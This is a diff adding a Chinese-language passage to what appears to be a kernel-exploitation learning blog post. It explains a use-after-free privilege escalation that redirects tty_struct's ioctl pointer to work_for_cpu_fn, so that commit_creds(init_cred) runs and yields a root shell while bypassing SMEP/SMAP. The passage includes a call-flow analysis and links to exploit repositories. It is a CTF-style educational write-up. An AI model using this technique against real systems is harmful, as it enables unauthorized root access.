+5.  **恢复内核对象原始状态**：权限状态变更完成后，代码执行`write(fd2, origin_tty, TTY_STRUCT_SIZE - 8)`。此操作至关重要，它将之前备份的原始`tty_struct`数据（保存在`origin_tty`中）写回内核，恢复被篡改的`tty_struct`对象。如果不进行此恢复操作，被修改的`tty_struct`（特别是其`ops`指针）可能导致后续任何通过该伪终端设备（`fd3`）进行的操作（例如在`get_root_shell()`中与终端交互）触发不可预期的内核行为或崩溃，因为其内部指针已被篡改，不再指向有效的`tty_operations`函数表。
+
+6.  **清理与后续操作**：恢复状态后，关闭伪终端文件描述符`fd3`，然后调用`get_root_shell()`函数启动一个具有新权限的shell进程。
+
+### 7-2. `work_for_cpu_fn` 函数原理解析
+
+`work_for_cpu_fn` 是Linux内核工作队列机制中的一个辅助函数。其设计目的是在指定的CPU核心上执行一个用户提供的函数。理解其工作原理是理解本技术演示的关键。
+
+- **功能定位**：该函数是工作队列系统的一部分，用于异步执行任务。工作队列允许将任务推迟执行，并且可以指定在哪个CPU上运行。
+- **数据结构关系**：
+    - `struct work_struct`：表示一个待执行的工作项。它包含一个函数指针成员`func`，指向实际要执行的函数（例如`work_for_cpu_fn`）。
+    - `struct work_for_cpu`：一个包装结构，它内嵌了一个`work_struct`，并额外增加了三个成员：`fn`（要执行的用户函数）、`arg`（用户函数的参数）和`ret`（用户函数的返回值）。
+- **执行流程**：
+    1.  当内核调度到某个`work_struct`时，会调用其`func`成员指向的函数。
+    2.  如果`func`指向`work_for_cpu_fn`，则该函数会通过`container_of`宏，从传入的`work_struct`指针推导出外层`struct work_for_cpu`结构体的地址。
+    3.  接着，`work_for_cpu_fn`执行`wfc->fn(wfc->arg)`，即调用用户预先设置好的函数`fn`，并传入参数`arg`。
+    4.  最后，将返回值存储在`wfc->ret`中。
+- **在本演示中的角色**：巧妙地利用了`work_for_cpu_fn`“执行一个由数据指定的函数指针”这一行为。通过精确控制`tty_struct`对象的内存布局，使其在`work_for_cpu_fn`的上下文中被重新解释为一个`struct work_for_cpu`。于是，对`tty->ops->ioctl`的调用，被转化为对`work_for_cpu_fn`的调用，进而触发对预设函数指针（`commit_creds`）的执行。**整个过程中，控制流始终在内核预定义的合法函数之间转移，没有执行任何非预期的指令序列，因此天然绕过了SMEP/SMAP等防护机制。**
+
+### 7-3. 技术对比与总结
+
+本方法的精髓在于“数据结构复用”和“合法执行路径引导”。它不注入外部代码，而是通过控制数据布局，引导内核将一种类型的对象（`tty_struct`）按照另一种类型（`work_for_cpu`）的语义进行解释，并利用该类型固有的、由数据驱动的代码执行路径来达成目标。
+
+| 特性维度          | 基于ROP链劫持`write`的方法         | 基于`work_for_cpu_fn`劫持`ioctl`的方法                                    |
+| :---------------- | :--------------------------------- | :------------------------------------------------------------------------ |
+| **技术本质**      | 控制流劫持，执行拼接的指令序列。   | **数据驱动/类型混淆**。通过控制数据布局，引导内核逻辑执行预设的函数指针。 |
+| **对抗SMEP/SMAP** | 需通过指令序列显式关闭相关保护位。 | **自然符合规范**。全程执行内核文本段中的导出函数，不涉及用户空间代码。    |
+| **实现复杂度**    | 较高，需构造多阶段指令序列。       | 相对较低，核心是精确的偏移计算与数据布局。                                |
+| **稳定性/通用性** | 受可用代码片段影响较大。           | 依赖特定内核函数的语义和内存布局，但思路具有启发性。                      |
+
+### 7-4. `ioctl` 系统调用流程分析
+
+本节将详细剖析在本次技术演示中，`ioctl` 系统调用在内核中的完整执行路径。理解从用户空间发起的请求如何经过虚拟文件系统、TTY子系统，最终触发预设的函数指针执行，是把握整个演示逻辑的关键。
+
+#### 7-4-1. 调用流程详解
+
+当研究程序执行 `ioctl(fd3, 0xdeadbeaf, 0xdeadbeaf)` 时，内核中将触发一系列函数调用，其完整路径如下：
+
+1.  **系统调用入口**：用户空间的 `ioctl()` 库函数封装了对 `ioctl` 系统调用的请求，通过软中断或 `syscall` 指令陷入内核，对应的内核入口点为 `SyS_ioctl()` 或 `SYSC_ioctl()`。
+
+2.  **虚拟文件系统（VFS）分发**：内核通过 `do_vfs_ioctl()` 开始处理此请求，进行通用的权限和参数检查。随后调用 `vfs_ioctl()` 函数，后者根据文件描述符 `fd3` 找到对应的 `struct file` 对象。对于字符设备文件，`vfs_ioctl()` 会调用该文件操作表中注册的 `unlocked_ioctl` 或 `compat_ioctl` 方法。在本例中，由于 `fd3` 对应一个伪终端主设备，其文件操作指向TTY子系统，因此会调用 `tty_ioctl()` 函数。
+
+3.  **TTY子系统通用处理**：`tty_ioctl()` 是TTY设备的通用 `ioctl` 处理函数。它负责解析大量的TTY特定命令（如设置波特率、窗口大小等）。对于许多需要驱动层实现的命令，或者无法在通用层处理的命令，它会将控制权传递给底层驱动。
+
+4.  **调用驱动特定操作**：在 `tty_ioctl()` 中，对于需要驱动处理的命令，会通过 `tty->ops->ioctl(tty, file, cmd, arg)` 来调用终端驱动注册的函数。**此调用是整个流程的核心转折点**。
+
+5.  **控制流重定向**：在本次技术演示构建的环境中，`tty_struct` 对象内的 `ops->ioctl` 指针已被修改为内核函数 `work_for_cpu_fn` 的地址。因此，当内核执行到此步骤时，控制流并未跳转到真正的设备驱动函数，而是跳转到了 `work_for_cpu_fn`。
+
+6.  **执行 `work_for_cpu_fn` 逻辑**：根据x86_64调用约定，`tty->ops->ioctl` 被调用时，其第一个参数（`RDI` 寄存器）是 `tty` 指针，即指向当前 `tty_struct` 对象内核地址（`fake_tty_addr`）的指针。`work_for_cpu_fn` 函数接收此参数作为其 `struct work_struct *work` 参数。
+    - 该函数通过 `container_of` 宏，利用 `work` 指针计算出外层 `struct work_for_cpu` 结构体（`wfc`）的地址。
+    - 由于内存布局已被预先精心构造，`wfc->fn` 成员指向 `commit_creds` 函数，`wfc->arg` 成员指向 `init_cred` 凭证地址。
+    - 因此，`work_for_cpu_fn` 执行 `wfc->fn(wfc->arg)` 的效果等同于执行 **`commit_creds(init_cred)`**，从而完成了进程权限状态的变更。
+
+7.  **返回与恢复**：函数执行完毕后，控制流沿调用链原路返回至用户空间。随后，演示程序会调用 `write(fd2, origin_tty, …)` 将备份的原始 `tty_struct` 数据写回，以恢复内核对象的状态，确保系统后续稳定运行。
+
+#### 7-4-2. 调用流程图
+
+以下Mermaid流程图直观地展示了上述调用路径，并清晰区分了正常执行流程与本次技术演示所构建的特殊执行流程：
+
+```mermaid
+graph TD
+    A["用户空间: ioctl(fd3, cmd, arg)"] --> B["系统调用: SyS_ioctl / SYSC_ioctl"]
+    B --> C["do_vfs_ioctl"]
+    C --> D["vfs_ioctl"]
+    D --> E["tty_ioctl"]
+    E --> F["tty->ops->ioctl(tty, cmd, arg)"]
+    F --> G{"路径选择"}
+
+    G -->|正常执行| H["执行驱动原始ioctl函数"]
+    G -->|技术演示场景| I["控制流重定向至 work_for_cpu_fn"]
+
+    I --> J["work_for_cpu_fn: 执行注册函数"]
+    J --> K["执行 wfc->fn(wfc->arg)"]
+    K --> L{"目标函数调用"}
+    L --> M["调用 commit_creds(init_cred)"]
+    M --> N["完成权限状态变更"]
+
+    style A fill:#e1f5e1,stroke:#2e7d32
+    style F fill:#ffebee,stroke:#c62828
+    style G fill:#e3f2fd,stroke:#1565c0
+    style I fill:#fff3e0,stroke:#ef6c00
+    style M fill:#f3e5f5,stroke:#7b1fa2
+```
+
+**流程说明**：
+
+- **绿色框**：表示流程起点，即用户空间对 `ioctl` 的调用。
+- **红色框**：表示**关键的分发点**，即对 `tty->ops->ioctl` 函数指针的解引用。此指针的值决定了后续整个控制流的走向。
+- **蓝色框**：表示分支判断点，清晰地展示了系统在正常情况与本次特定技术演示场景下不同的执行路径。
+- **橙色框**：描绘了演示路径的核心阶段。控制流被重定向至合法的内核函数 `work_for_cpu_fn`，该函数按照其固有逻辑解释传入的参数并执行相应的函数指针。
+- **紫色框**：表示演示的最终目标，即通过执行合法的内核权限管理函数完成状态变更。
+
+### 7-5. 总结
+
+本章分析的方法展示了一种侧重于数据流控制的内核级技术研究思路。它放弃了直接控制非预期指令序列的执行，转而寻求对内核**现有执行逻辑**的精准引导。通过使被修改的内核对象（`tty_struct`）在特定上下文（`work_for_cpu_fn`中）被重新解释为另一个合法对象（`work_for_cpu`），并利用该对象语义中预设的函数指针调用机制，研究者以一种完全遵循内核调用规范的方式演示了权限变更。这种技术对基于控制流完整性的防御机制提出了不同维度的思考，因为它并未违背基本控制流规则，而是通过操控数据流来影响合法控制流的行为。最后，通过恢复原始内核对象状态，确保了系统后续操作的稳定性，体现了完整的技术研究流程。
+
+### 7-6. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/UAF/UAF_003.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 https://github.com/BinRacer/pwn4kernel/tree/master/src/UAFwithCred
+https://github.com/BinRacer/pwn4kernel/tree/master/src/UAFwithTTY
+https://github.com/BinRacer/pwn4kernel/tree/master/src/UAFwithTTY2
+https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#例题：CISCN-2017-babydriver
